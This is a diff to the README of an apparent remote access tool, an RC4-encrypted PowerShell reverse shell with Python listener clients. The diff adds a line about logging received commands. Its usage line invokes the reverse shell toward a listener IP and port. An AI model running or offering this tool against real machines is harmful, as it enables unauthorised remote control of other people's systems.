@@ -1,6 +1,8 @@
 # RC4-PowerShell-RAT
 Simple powershell reverse shell using RC4 encryption for all the commands and payloads. PsShellClient.py only accept one client at the time. MultiPsShellClient.py accept several clients at the time.
 
+The RAT will also save all the commands and output received in a log file.
+
 # Usage
 ```
 PS-RemoteShell -ip 1.1.1.1 -port 1111 -key test
